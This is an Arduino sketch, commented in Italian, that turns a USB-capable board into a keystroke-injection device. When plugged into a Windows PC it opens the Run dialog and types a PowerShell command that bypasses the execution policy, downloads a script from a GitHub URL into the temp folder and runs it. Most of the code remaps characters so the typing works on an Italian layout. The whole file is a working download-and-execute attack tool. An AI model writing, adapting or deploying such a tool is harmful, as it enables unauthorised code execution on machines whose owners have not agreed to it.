#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// ── MODIFICA SOLO QUESTA RIGA ─────────────────────────────────────────────────
static const char URL[] =
    "powershell -ExecutionPolicy Bypass -Command "
    "\"$f=\\\"$env:TEMP\\\\bootstrap.ps1\\\"; iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1' -o $f; & $f\"";
// ────────────────────────────────────────────────────────────────────────────

static constexpr uint32_t DELAY_HID_INIT   = 8000U;
static constexpr uint32_t DELAY_RUN_DIALOG = 1200U;
static constexpr uint32_t DELAY_PER_CHAR   =   30U;

USBHIDKeyboard Keyboard;

static void pressCombo(uint8_t k1, uint8_t k2 = 0) {
    Keyboard.press(k1);
    if (k2) Keyboard.press(k2);
    delay(100);
    Keyboard.releaseAll();
    delay(80);
}

/*
 * MAPPATURA TASTIERA ITALIANA
 * ============================
 * Layout IT ha differenze rispetto a layout US per questi caratteri:
 * 
 * Carattere | Posizione IT              | Come pressare
 * ────────────────────────────────────────────────────────────────
 *    '      | Tasto accento grave       | ['] (tasto a sinistra dell'1)
 *    "      | Shift + '2'               | Shift + [2]
 *    /      | Shift + '7'               | Shift + [7]
 *    \      | Alt Gr + '\'              | Alt Gr + [\\]
 *    |      | Alt Gr + \                | Alt Gr + [\\]
 *    -      | Tasto trattino            | [-] (tasto vicino a 0)
 *    _      | Shift + [-]               | Shift + [-]
 */

static void typeCharIT(char c) {
    switch (c) {
        case '$':
            // Simbolo del dollaro in IT = Shift+4
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('4'); delay(50); Keyboard.releaseAll();
            break;
        case '&':
            // E commerciale in IT = Shift+6
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('6'); delay(50); Keyboard.releaseAll();
            break;
        case '=':
            // Uguale in IT = tasto [=] (a destra del trattino)
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('0'); delay(50); Keyboard.releaseAll();
            break;
        case ';':
            // Punto e virgola in IT = Shift+','
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press(','); delay(50); Keyboard.releaseAll();
            break;
        case '\'':
            // Apostrofo in IT = tasto accento grave (a sinistra dell'1)
            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
            break;
        case '"':
            // Virgolette in IT = Shift+2
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('2'); delay(50); Keyboard.releaseAll();
            break;
        case '/':
            // Slash in IT = Shift+7
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('7'); delay(50); Keyboard.releaseAll();
            break;
        case '\\':
            // Backslash in IT = Alt Gr + (il tasto che digita \)
            Keyboard.press('`'); 
            delay(50); 
            Keyboard.releaseAll();

            break;
        case '|':
            // Pipe in IT = Alt Gr + (il tasto che digita \)
            Keyboard.press(KEY_RIGHT_SHIFT); 
            Keyboard.press('~');
            delay(50); 
            Keyboard.releaseAll();
            break;
        case '-':
            // Trattino in IT = tasto [-] (a destra dello 0)
            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
            break;
        case '_':
            // Underscore in IT = Shift+[-]
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
            break;
        case ':':
            // Due punti in IT = Shift+'.'
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
            break;
        case '.':
            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
            break;
        default:
            Keyboard.print(c);
            break;
    }
    delay(DELAY_PER_CHAR);
}


static void typeStringIT(const char* str) {
    while (*str != '\0') { typeCharIT(*str++); }
}

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(DELAY_HID_INIT);

    // Apri Win+R
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(DELAY_RUN_DIALOG);

    // Digita il comando con rimappatura italiana
    typeStringIT(URL);
    delay(400);
    pressCombo(KEY_RETURN);
}

void loop() {
    delay(60000U);
}
